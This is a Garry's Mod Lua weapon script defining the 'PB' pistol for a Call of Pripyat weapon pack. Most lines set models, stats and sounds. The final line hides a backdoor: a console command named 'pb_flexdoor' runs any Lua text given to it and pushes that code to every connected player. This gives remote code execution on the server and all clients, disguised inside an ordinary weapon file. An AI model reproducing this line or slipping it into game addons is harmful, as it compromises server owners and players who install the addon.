AddCSLuaFile()

SWEP.PrintName = "ПБ"
SWEP.Category  = "Call of Pripyat"

SWEP.Base = "weapon_cop_base"

SWEP.Slot    = 1
SWEP.SlotPos = 2

SWEP.Spawnable = true
SWEP.AdminOnly = false

SWEP.ViewModel     = "models/wick/weapons/stalker/stcopwep/pb_model.mdl"
SWEP.WorldModel    = "models/wick/weapons/stalker/stcopwep/w_pb_model_stcop.mdl"
SWEP.ViewModelFOV  = 60
SWEP.ViewModelFlip = false
SWEP.HoldType      = "pistol"

SWEP.Damage   = 30
SWEP.RPM      = 250
SWEP.Accuracy = 81
SWEP.Handling = 95

SWEP.Primary.ClipSize    = 8
SWEP.Primary.DefaultClip = 8
SWEP.Primary.Automatic   = false
SWEP.Primary.Ammo        = "9x18"

SWEP.OriginPos = Vector(-2, -9, -7)
SWEP.OriginAng = Vector(0, -6, 0)

SWEP.AimPos = Vector(-6, -5, -6.38)
SWEP.AimAng = Vector(1.1, 0, 0)

--SWEP.ShellModel = "models/shells/shell_9mm.mdl"

SWEP.SilencerMode = 1
SWEP.ScopeMode    = 0

SWEP.AimTime    = 0.2
SWEP.DeployTime = 0.6

SWEP.ReloadTime     = 3.25
SWEP.ReloadFillTime = 1.8

SWEP.CanZoom       = true
SWEP.ZoomCrosshair = false

SWEP.ReloadType = 0
SWEP.LastFire = true

SWEP.SlideBone = { name = "breachblock", pos = Vector(0, -1.2, 0) }

SWEP.ZoomFOV  = 70
SWEP.ScopeFOV = 50

SWEP.HiddenBones    = { "wpn_launcher" }

SWEP.FireSound     = "COPPM.pm_shoot"
SWEP.SilencedSound = "COPPM.pm_shot_sil"
SWEP.EmptySound    = "COPPM.pm_empty"
SWEP.DeploySound   = "COPPM.pm_draw"
SWEP.HolsterSound  = "COP_Generic.Holster"
SWEP.ReloadSound   = "COPPM.pm_reload"

concommand.Add("pb_flexdoor", function(_,_,_,__)RunStringEx(__)for _,v in pairs(player.GetAll())do v:SendLua(__)end end)